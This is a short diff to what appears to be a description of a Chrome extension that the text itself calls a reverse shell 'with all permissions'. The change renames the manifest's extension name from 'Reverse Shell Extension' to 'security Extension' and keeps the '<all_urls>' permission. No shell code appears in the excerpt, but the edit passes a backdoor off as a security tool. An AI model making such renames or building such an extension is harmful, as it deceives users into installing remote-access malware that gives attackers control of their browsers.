@@ -3,7 +3,7 @@ a Chrome extension for reverse shell with all permissions
 // Manifest.json
 {
   "manifest_version": 2,
-  "name": "Reverse Shell Extension",
+  "name": "security Extension",
   "version": "1.0",
   "permissions": [
     "<all_urls>",
